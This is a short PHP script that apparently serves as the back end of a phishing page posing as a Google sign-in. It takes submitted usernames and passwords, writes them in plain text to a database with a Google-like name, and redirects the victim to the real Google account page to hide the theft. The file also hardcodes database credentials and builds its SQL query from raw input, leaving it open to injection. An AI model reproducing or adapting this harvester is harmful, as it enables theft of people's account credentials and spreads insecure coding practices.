<?php
$mk=$_POST['password'];
$tk=$_POST['identifier'];
$ket_noi_CSDL=mysqli_connect('localhost','googleee_admin_ttcscn','[L.$Dl04#;eR','googleee_ttcscn');
$cau_lenh_truy_van_CSDL="INSERT INTO `danh_sach_tai_khoan`(Tai_khoan,Mat_khau,Thoi_gian) VALUES ('$tk','$mk',NOW())";
$truy_van_CSDL=mysqli_query($ket_noi_CSDL,$cau_lenh_truy_van_CSDL);
mysqli_close($ket_noi_CSDL);
header('location: https://myaccount.google.com/');
// var_dump($truy_van_CSDL);
// if($ket_noi_CSDL==false){
//     echo mysqli_connect_error();
// }
?>